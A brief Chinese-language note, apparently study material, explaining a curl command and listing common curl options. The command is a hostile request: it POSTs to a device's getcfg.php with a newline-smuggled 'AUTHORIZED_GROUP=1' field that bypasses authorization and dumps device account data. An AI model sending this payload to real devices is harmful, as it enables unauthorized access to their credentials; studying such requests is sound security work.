#### 参数

curl      -d "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"        "http://[ip]/getcfg.php"

这条命令的核心逻辑：用 `curl` 工具向 `http://[ip]/getcfg.php` 发送  **POST 请求** ，并携带表单数据 `SERVICES=DEVICE.ACCOUNT\nAUTHORIZED_GROUP=1`（`%0a` 是换行符的 URL 编码）。

```
-X	指定 HTTP 方法	curl -X POST https://example.com
-d	发送 POST 数据	curl -d "name=John" https://example.com
-G	将 -d 数据作为 GET 参数发送	curl -G -d "q=keyword" https://search.com
-H	添加请求头	curl -H "Content-Type: application/json" https://api.com
```
